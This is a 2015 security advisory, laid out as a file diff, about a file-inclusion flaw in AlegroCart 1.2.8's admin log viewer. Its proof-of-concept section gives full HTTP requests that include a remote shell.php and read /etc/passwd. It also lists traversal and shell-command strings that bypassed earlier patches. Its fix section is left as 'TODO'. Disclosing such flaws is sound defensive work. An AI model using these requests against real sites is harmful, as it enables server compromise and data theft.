@@ -1,0 +1,129 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    AlegroCart 1.2.8
+Fixed in:            Patch AC128_fix_22102015
+Path Link:           http://forum.alegrocart.com/download/file.php?id=1047
+Vendor Website:      http://alegrocart.com/
+Vulnerability Type:  LFI/RFI
+Remote Exploitable:  Yes
+Reported to vendor:  09/29/2015
+Disclosed to public: 11/13/2015
+Release mode:        Coordinated release
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Vulnerability Description
+
+CVSS
+
+Medium 6.5 AV:N/AC:L/Au:S/C:C/I:C/A:C
+
+Description
+
+When retrieving logs, there are no checks on the given file_path Parameter.
+Because of this, local or remote files can be included, which are then executed
+or printed.
+
+Admin credentials are required to view logs.
+
+3. Proof of Concept
+
+Remote File:
+
+
+POST /ecommerce/AlegroCart_1.2.8/upload/admin2/?controller=report_logs HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: alegro=accept; admin_language=en; alegro_sid=96e1abd77b24dd6f820b82eb32f2bd04_36822a89462da91b6ad8c600a468b669; currency=CAD; catalog_language=en
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------16809437203643590021165278222
+Content-Length: 441
+
+-----------------------------16809437203643590021165278222
+Content-Disposition: form-data; name="directory"
+
+error_log
+-----------------------------16809437203643590021165278222
+Content-Disposition: form-data; name="file_path"
+
+http://localhost/shell.php
+-----------------------------16809437203643590021165278222
+Content-Disposition: form-data; name="decrytion"
+
+0
+-----------------------------16809437203643590021165278222--
+
+Local File:
+
+
+POST /ecommerce/AlegroCart_1.2.8/upload/admin2/?controller=report_logs HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: alegro=accept; admin_language=en; alegro_sid=96e1abd77b24dd6f820b82eb32f2bd04_36822a89462da91b6ad8c600a468b669; currency=CAD; catalog_language=en
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------16809437203643590021165278222
+Content-Length: 425
+
+-----------------------------16809437203643590021165278222
+Content-Disposition: form-data; name="directory"
+
+error_log
+-----------------------------16809437203643590021165278222
+Content-Disposition: form-data; name="file_path"
+
+/etc/passwd
+-----------------------------16809437203643590021165278222
+Content-Disposition: form-data; name="decrytion"
+
+0
+-----------------------------16809437203643590021165278222--
+
+For the patches AC128_fix_13102015 and AC128_fix_17102015 the following attack
+strings were still working:
+
+
+http://localhost/shell.php?x=ls&foo=/var/www/ecommerce/AlegroCart_1.2.8/upload/logs/error_log/
+
+/var/www/ecommerce/AlegroCart_1.2.8/upload/logs/error_log/../../../../../../../etc/passwd
+
+4. Code
+
+
+/ upload/admin2/controller/report_logs.php
+function get_file(){
+        $file = '';
+        if($this->request->gethtml('file_path', 'post')){
+                $file = file_get_contents($this->request->gethtml('file_path', 'post'));
+        }
+        if($this->request->gethtml('decrytion', 'post')){
+                $file = $this->ccvalidation->deCrypt($file, $this->config->get('config_token'));
+        }
+        if($file){
+                $file = str_replace(array("\r\n", "\r", "\n"),'<br>', $file);
+        }
+        return $file;
+}
+
+5. Solution
+
+To mitigate this issue please apply this patch:
+
+TODO
+
+Please note that a newer version might already be available.
+
+6.. Report Timeline
+
+09/29/2015 Informed Vendor about Issue
+11/03/2015 Vendor releases fix
+11/13/2015 Disclosed to public
+
+
+Blog Reference:
+http://blog.curesec.com/article/blog/AlegroCart-128-LFIRFI-102.html
